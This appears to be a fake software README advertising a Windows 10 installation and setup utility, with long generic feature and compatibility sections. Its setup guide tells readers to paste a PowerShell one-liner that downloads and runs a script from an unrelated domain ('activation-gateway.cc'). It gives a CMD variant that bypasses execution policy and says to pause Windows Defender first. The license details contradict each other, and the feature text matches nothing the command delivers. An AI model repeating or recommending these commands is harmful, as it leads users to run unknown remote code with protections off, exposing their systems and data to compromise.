<div align="center">

# Windows 10 Installer & Setup Tool for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Girishkakde/win10-installer-tool/main/thumb_17256a5.svg)

[![platform](https://img.shields.io/badge/Platform-Windows-f97316?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-X11-fb923c?style=flat&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/Powershell-7%2B-ea580c?style=flat&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/Installs-184K-c2410c?style=flat&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/Stars-4.7%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Production-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Windows-rpocket-10-Full-22H2-Version is a desktop installer utility for deploying or reinstalling Windows 10 on compatible hardware. It prepares bootable installation media, launches the setup process, and provisions a complete Windows 10 environment through a guided deployment workflow. The tool integrates image handling and setup automation to reduce manual configuration during installation. It is intended for technicians and end users who require a repeatable, feature-driven path to a running Windows 10 system.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Installation Media Preparation:** Generates bootable USB and ISO installation media with configurable partition schemes (MBR/GPT) and filesystem options, ensuring compatibility with both legacy BIOS and UEFI firmware.

- **Guided Setup Workflow:** Provides a structured wizard that walks through language selection, edition targeting, and disk configuration, reducing manual entry and minimizing configuration errors during installation.

- **Image Servicing Integration:** Supports WIM and ESD image handling for applying, capturing, and splitting installation images, enabling deployment of customized Windows 10 builds.

- **Unattended Installation Support:** Offers optional answer-file generation for automated setup, including user account pre-configuration, regional settings, and post-installation task sequencing.

- **Compatibility Verification:** Performs pre-installation hardware checks covering storage controllers, firmware mode, TPM state, and minimum resource thresholds to flag potential issues before deployment begins.

- **Edition and Architecture Selection:** Enables selection among multiple Windows 10 editions and architectures from a unified interface, with validation of the chosen target against available image contents.

- **Recovery and Reinstallation Mode:** Supports in-place reinstallation and clean-slate recovery workflows, preserving user data where applicable and restoring system components to a known-good state.

- **Offline Driver Injection:** Allows injection of storage and chipset drivers into the installation image prior to deployment, addressing compatibility with newer hardware platforms.

- **Progress and Logging:** Displays real-time status during media creation and setup operations, with detailed logs for troubleshooting and post-deployment auditing.

## How it works

The tool operates through a staged deployment pipeline that coordinates media preparation, image servicing, and setup orchestration.

- **Media preparation:** The installer validates the selected target device, formats it with the appropriate file system layout, and writes the boot environment alongside the installation payload so the resulting media is immediately bootable.
- **Image handling:** Installation sources are read from the bundled image package, verified for integrity, and applied to the target volume using sector-level writes. Existing partitions are detected and handled according to the chosen installation mode.
- **Unattended configuration:** Setup parameters such as locale, account provisioning, and driver injection are assembled into an answer file that the Windows setup engine consumes automatically, removing manual prompts during installation.
- **Boot environment management:** The tool configures the firmware boot order and writes the required bootloader entries, ensuring the target system starts the setup process without additional user intervention.
- **Compatibility checks:** Before deployment begins, the tool inspects storage controllers, firmware mode, and secure boot state to confirm the target hardware meets the requirements of the selected Windows 10 release.
- **Progress and verification:** Each stage reports status to the interface, and completion is confirmed by re-reading the deployed image to verify that all files were written correctly.

## Compatibility

The tool is designed to operate across the full Windows 10 release spectrum, with primary validation targeting the 22H2 feature update and its servicing branches. Compatibility is assessed at three layers: the host environment executing the installer, the target firmware and storage subsystem receiving the deployment, and the image payload being staged.

**Host Environment**
- Supported operating systems: Windows 10 (all editions, x64 and x86) and Windows 11, with elevated privileges required for image capture and partition operations.
- Minimum runtime: 4 GB RAM for the installer process, with 8 GB or more recommended when servicing large WIM/ESD payloads.
- Storage: sufficient free space on the working volume to hold the extracted image plus a staging buffer sized to the target edition.
- Dependencies: the Windows Assessment and Deployment Kit components relied upon by the DISM servicing pipeline must be present or resolvable on the host.

**Target Firmware and Hardware**
- UEFI and Legacy BIOS boot paths are both supported; Secure Boot state is detected and reported during the hardware verification pass.
- Storage controllers are validated asynchronously, with offline driver injection available for controllers not natively recognized by the boot environment.
- Multi-architecture preinstallation environments are generated to match the target platform, including network boot scenarios.

**Image and Payload Support**
- WIM and ESD image formats are handled through low-level image API wrappers, supporting capture, mount, and apply operations.
- Unattended configuration generation accounts for drive allocation, user profile pre-configuration, and bypass routines appropriate to the selected edition.
- Cumulative updates, offline drivers, and optional system features can be injected into the image prior to deployment.

**Known Constraints**
- Deployment to systems with non-standard partition layouts may require manual adjustment of the generated unattended configuration.
- Hardware compatibility checks are advisory; validation results should be reviewed before committing to a full reinstall.
- Firmware-level restrictions on certain OEM platforms may limit boot environment options and should be confirmed against the target device documentation.

## Disclaimer

This software is provided strictly on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, or non-infringement. Windows-rpocket-10-Full-22H2-Version is an independent deployment utility and is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. All trademarks, product names, and operating system designations referenced within the application or its documentation remain the property of their respective owners and are used solely for identification and interoperability purposes.

The tool performs low-level operations against system images and installation media, including WIM/ESD image mounting, DISM servicing, offline driver injection, and boot environment configuration. These operations can modify partition tables, boot records, and operating system files in ways that may render a target machine unbootable or cause irreversible data loss. Users are solely responsible for verifying hardware compatibility, maintaining complete and independently verified backups of all data, and validating installation media integrity before initiating any deployment sequence. The authors and maintainers accept no liability for hardware damage, data loss, system instability, licensing non-compliance, or any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use this software, regardless of the theory of liability and whether or not advised of the possibility of such damages.

By downloading, extracting, or executing Windows-rpocket-10-Full-22H2-Version, you acknowledge that you have read and understood this notice, that you assume full responsibility for all actions performed using the tool, and that you hold the authors and contributors harmless from any claims arising out of its use.

## License

This project is released under the MIT License, granting permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software and its associated documentation, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Redistribution and modification are permitted provided that the copyright notice and this license are retained. Derivative works may be distributed under different terms only where permitted by the MIT License conditions. No trademark or branding rights are granted beyond those necessary to exercise the permissions described above.